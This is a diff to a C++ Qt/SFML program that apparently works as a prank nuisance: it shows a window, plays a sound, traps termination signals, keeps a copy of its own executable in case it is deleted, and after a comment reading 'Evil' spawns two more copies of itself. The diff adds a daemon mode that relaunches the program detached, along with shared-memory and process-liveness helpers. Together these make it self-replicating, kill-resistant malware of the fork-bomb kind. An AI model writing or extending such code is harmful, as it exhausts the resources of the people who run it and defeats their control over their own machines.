@@ -9,6 +9,7 @@
 #include <QtCore/QProcess>
 #include <QtCore/QFile>
 #include <QtCore/QFileDevice>
+#include <QtCore/QSharedMemory>
 
 // SFML
 #include <SFML/Audio/Music.hpp>
@@ -16,6 +17,7 @@
 // Standard
 #include <ctime>
 #include <iostream>
+#include <iomanip>
 
 // Graphic and sound
 #include "assets.h"
@@ -24,6 +26,7 @@
 #include <unistd.h>
 #include <signal.h>
 #include <time.h>
+#include <errno.h>
 #endif
 
 #ifdef WIN32
@@ -32,6 +35,8 @@
 
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
+//#define SEGMENT_SZ 1*1000*512 //512Kb
+#define SEGMENT_SZ 1*1000
 
 long exe_length;
 QFile exe_file;
@@ -41,7 +46,6 @@ int perms;
 // Since we may launch multiple times a second, we need something just a bit
 // more random than std::time()
 int os_get_random() {
-
 #ifdef __unix__
   return getpid() + clock();
 #endif
@@ -50,12 +54,70 @@ int os_get_random() {
   return (GetTickCount64t()%99999) + std::time(NULL);
 #endif
 
-return std::time(NULL);
+  return std::time(NULL);
+}
 
+void os_sleep(long ms) {
+#ifdef __unix__
+  usleep(ms*1000);
+#endif
+
+#ifdef WIN32
+  Sleep(ms);
+#endif
+  return;
+}
+
+long os_get_pid() {
+#ifdef __unix__
+  return (long)getpid();
+#endif
+
+#ifdef WIN32
+  return (long)GetProcessId();
+#endif
 }
 
 static void button_response() {
   QApplication::quit();
+}
+
+void print_segment_hex(QSharedMemory *s) {
+  unsigned char *data = (unsigned char*)s->data();
+  int i=0;
+  while (i < s->size()) {
+    for (int j=0;j<30;j++) {
+      std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
+      i++;
+    }
+    std::cout << std::endl;
+  }
+}
+
+void deamon_loop() {
+  QSharedMemory segment(QString::number(os_get_random()));
+  segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
+  print_segment_hex(&segment);
+
+  QProcess::startDetached(exe_file.fileName());
+}
+
+bool is_proc_alive(long pid) {
+#ifdef __unix__
+  kill(pid, 0);
+  if (errno == ESRCH) {
+    errno = 0;
+    return false;
+  }
+#endif
+
+#ifdef WIN32
+  HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+  if (proc == NULL)
+    return false;
+  CloseProcess(proc);
+#endif
+  return true;
 }
 
 void spawn_two_more() {
@@ -79,7 +141,6 @@ void spawn_wrapper(int i) {
 }
 
 void trap_setup() {
-
 #ifdef __unix__
   signal(SIGTERM, spawn_wrapper);
   signal(SIGINT, spawn_wrapper);
@@ -92,15 +153,21 @@ void trap_setup() {
   //TODO
 #endif
   return;
-
 }
 
 int main(int argc, char* argv[])  {
 
+  exe_file.setFileName(argv[0]);
+
+  // No PID in argv, so start daemon mode
+  if (argc <= 1) {
+    deamon_loop();
+    return 0;
+  }
+
   trap_setup();
 
   // Read in the executable file, in case they try to delete it
-  exe_file.setFileName(argv[0]);
   exe_file.open(QIODevice::ReadOnly);
   perms = exe_file.permissions();
   exe_data = exe_file.readAll();
@@ -113,9 +180,10 @@ int main(int argc, char* argv[])  {
   window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);
 
   // Setup and play Audio
-  sf::Music music;
-  music.openFromMemory(chord_ogg, CHORD_LENGTH);
-  music.play();
+  sf::Music *music = new sf::Music;
+  music->openFromMemory(chord_ogg, CHORD_LENGTH);
+  //music->setVolume(100);
+  music->play();
   //QApplication::beep();
 
   // Setup layouts
@@ -159,6 +227,8 @@ int main(int argc, char* argv[])  {
   window.setLayout(&layout);
   window.show();
   app.exec();
+
+  delete music;
 
   // Evil
   spawn_two_more();
